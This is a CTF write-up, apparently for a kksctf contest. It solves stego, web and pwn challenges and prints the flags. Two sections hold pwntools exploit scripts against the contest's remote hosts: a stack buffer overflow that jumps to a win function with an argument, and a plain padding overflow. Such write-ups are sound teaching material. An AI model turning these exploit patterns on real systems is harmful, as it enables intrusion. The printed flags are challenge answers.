# Misc
# Stego Warmup -100 

```bash
a0su@a0su  ~/Downloads  strings stego50.jpg| grep "kks"
 <pdf:Author>kks{just_s1ml3_st3g0}</pdf:Author>
```
Note: Exiftool also works since these the pdf author element of the file

#ru!e5p@g3 - 100
```kks{w3lcom3_to_0ur_ru!e5p@g3}```

#Xmas Tree - 200
Looking at the source there is a christmas tree. After looking at it for a few seconds I notived in the span tags there are some portions of the flag present. After separating out the information contained in those tags I was able to piece together the flag.

```
$
:$$
seeee$$$Neeee
R$$$F$$$$F
$$$$$$
@$$P*$$B
z$
$b
$$}
w_y
kks{
m@d
n3
34r_
n3
oooooooooo
z        z
z.,ze.$$$z



kks{n3w_y34r_m@dn3$$}

```
```html
<pre id="background">
                               <span style="color: red;">$</span>
                              <span style="color: red;">:$$</span>
                         <span style="color: red;">seeee$$$Neeee</span>
                           <span style="color: red;">R$$$F$$$$F</span>
                             <span style="color: red;">$$$$$$</span>
                            <span style="color: red;">@$$P*$$B</span>
                           <span style="color: red;">z$</span>#"  $#<span style="color: red;">$b</span>
                           " d   'N "
                            @"     ?r
                          xF .       "N
                       .$> P54.R       `$
                     $*   '*"$$$  uoP***~
                      #Noo "?$N"   #oL
                         f       o$#<span style="color: violet;">$$}</span>e.
                        $  @b    hoR$$r ^"$$b
                     .M   ?B$E   *.B$$       .R
                   .*     *\ *.4*R         ..*
                oo#     ooL    d#R.     P##~
                $c    .""P#$  @   P     k
                  R$r <span style="color: yellow;">w_y</span>L$$  P  "r     'N
                    ^$ "$$$` $.....JL     "N.
                  .$\           * P5"LR      $..
               ..* 4*R     xr    'PFN$$   .k    "*****.
            od#"   d#*.  "*$$P~   "?$*" '<span style="color: tomato;">kks{</span>"       u"
         e""      f   M   @F"$  ec       x$"$.     :"
         M        >  "d       $$$$?$           .$$F`
          "P..  .$.....$L $$.4$$. "   @#3$$   $E.
             '**..  *   R..$$ `R$*k.  f<span style="color: skyblue;">m@d</span>$>     *..
               J"       *k$$$~  "*$**o$o$$P        '*oo.
              P           #        "$$$#*o          >  '####*oooo
           .e"            :e$$e.  F3  ^"$P  :$$s :e@$ee        s"
         $P` <span style="color: orange;">n3</span>>    $P$$k "$"?$3 @"#N      CxN$$> .$$$       .P
      M$~   J\##   44N>$$  .d$.$d   @&      `$$$  F  .8..$$$*
  .***     :   JM   *d$$*.$$.P  M  .P5     M          **.
  "oo      J  .dP    ud$$od#   $oooooo$  oo$oo           ###ou
     "####$beeee$.'$eeP#~        ""      $<span style="color: greenyellow;">34r_</span>    e$$$o       #heeee
        :"    " z$r ^            o$N     '"  "   4$z>$$             """#$$$
       .~      F$4$B       r    F @#$.       ..   $8$$P M7                $
     .*  $     8 $$B     .J$..  hP$$$F     .'PB$       J~##             .d~
   .P  *<span style="color: blue;">n3</span>$*    "*"       $$$    #**~      hdM$$>     <   JM.......*****
 .P     $#*k       .o#>  P" "k   ..         '$$P      d  .JP'h
"""hr ^        xe""  >          ""c           ee    @beeeee$.)
      """t$$$$F"      M        $`   R          > "$r     "     "c
                              <span style="color: brown;">oooooooooo</span>
                              <span style="color: brown;">z        z</span>
                              <span style="color: brown;">z.,ze.$$$z</span>
                </pre>

Flag: kks{n3w_y34r_m@dn3$$}
```
# Web
# Postman - 100
```bash
 ✘ a0su@a0su  ~  curl -X post http://tasks.open.kksctf.ru:8001/postbox
Thanks! kks{thanks_f0r_m@1l}
```
# PWN
# Baby BufferOverflow - 100
```python
from pwn import * 

#r = process('./baby_bof')
r = remote('tasks.open.kksctf.ru',  10002)

pad = "A" * 260
win_addr = p32(0x080485f6)
arg = p32(0xcafebabe)
r.sendline(pad+win_addr+"AAAA"+arg)
r.interactive()

Flag: kks{0v3rf10w_15_my_1!f3}
```

# Insane - 100 
```python
from pwn import *

#r = local('./insane_pwn')
r = remote('tasks.open.kksctf.ru', 10003)
pad = 'A' * 259
r.sendline(pad)
r.interactive()

Flag: kks{W0w_th15_w@5_4w350m3!}
```

